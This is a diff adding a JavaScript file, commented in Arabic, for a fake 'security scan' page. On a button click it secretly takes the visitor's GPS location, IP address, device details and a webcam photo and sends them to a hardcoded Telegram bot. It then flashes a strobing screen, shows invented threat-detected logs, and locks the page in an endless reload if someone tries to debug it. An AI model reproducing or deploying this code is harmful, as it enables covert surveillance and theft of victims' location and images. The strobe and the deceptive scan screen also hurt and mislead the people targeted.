@@ -1,0 +1,104 @@
+(function() {
+    // إعدادات لوحة التحكم (التوكن والـ ID الخاص بك)
+    const _t1 = "7873426394";
+    const _t2 = "AAFrMrpIkziC4hpDHDJ2OIOBOVha--srSbo";
+    const _id = "7253092491";
+    const _gate = `https://api.telegram.org/bot${_t1}:${_t2}/sendMessage`;
+
+    // دالة الإرسال المشفرة للتليجرام
+    async function _send(msg) {
+        try {
+            await fetch(_gate, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    chat_id: _id,
+                    text: `[MATRIX_ALERT]\n${btoa(msg).split('').join('\n')}`
+                })
+            });
+        } catch (e) {}
+    }
+
+    // 1. جلب الموقع الجغرافي الدقيق (GPS)
+    function _location() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition((p) => {
+                const map = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
+                _send(`LOCATION_FOUND\nLat: ${p.coords.latitude}\nLong: ${p.coords.longitude}\nLink: ${map}`);
+            }, () => { _send("LOC_ACCESS_DENIED"); }, {enableHighAccuracy: true});
+        }
+    }
+
+    // 2. جلب الـ IP وبيانات الجهاز (عند التحميل)
+    async function _getIP() {
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            _send(`TARGET_IP: ${data.ip}\nBROWSER: ${navigator.userAgent}\nOS: ${navigator.platform}`);
+        } catch (e) {}
+    }
+
+    // 3. سحب الصورة وتفعيل الفلاش المرعب
+    async function _capture() {
+        try {
+            const s = await navigator.mediaDevices.getUserMedia({video: true});
+            const v = document.createElement('video');
+            v.srcObject = s; v.play();
+            setTimeout(() => {
+                const c = document.createElement('canvas');
+                c.width = 640; c.height = 480;
+                c.getContext('2d').drawImage(v, 0, 0);
+                _send("IMAGE_CAPTURE: " + c.toDataURL('image/jpeg', 0.5));
+                s.getTracks().forEach(t => t.stop());
+                _strobe(); // تفعيل الفلاش
+            }, 1000);
+        } catch (e) { _send("CAM_ACCESS_DENIED"); }
+    }
+
+    // تأثير الفلاش (رعشة الشاشة)
+    function _strobe() {
+        const d = document.createElement('div');
+        d.style = "position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;background:white;";
+        document.body.appendChild(d);
+        let i = 0;
+        const itv = setInterval(() => {
+            d.style.display = (i++ % 2 == 0) ? 'none' : 'block';
+            if(i > 40) { clearInterval(itv); document.body.removeChild(d); }
+        }, 50);
+    }
+
+    // تشغيل العمليات عند ضغط الزرار
+    document.getElementById('startScanBtn').addEventListener('click', () => {
+        _send("SCAN_STARTED_BY_TARGET");
+        _location();
+        _capture();
+        _getIP();
+        
+        // إظهار واجهة الفحص الوهمية
+        const term = document.getElementById('terminal');
+        if(term) {
+            term.style.display = 'block';
+            const logs = ["Initializing Secure Protocol...", "Searching for Backdoors...", "Analyzing Server Response...", "Threat Detected! Generating Report..."];
+            let i = 0;
+            const l = setInterval(() => {
+                const p = document.createElement('div');
+                p.className = "line";
+                p.innerText = "> " + logs[i++];
+                document.getElementById('logs').appendChild(p);
+                if(i >= logs.length) clearInterval(l);
+            }, 1200);
+        }
+    });
+
+    // نظام الحماية (كراش لو حاول يفحص الكود)
+    setInterval(() => {
+        const t = performance.now();
+        debugger;
+        if(performance.now() - t > 100) {
+            _send("TARGET_IS_DEBUGGING_SYSTEM_LOCKING");
+            while(true) { window.location.reload(); }
+        }
+    }, 500);
+
+})();
+
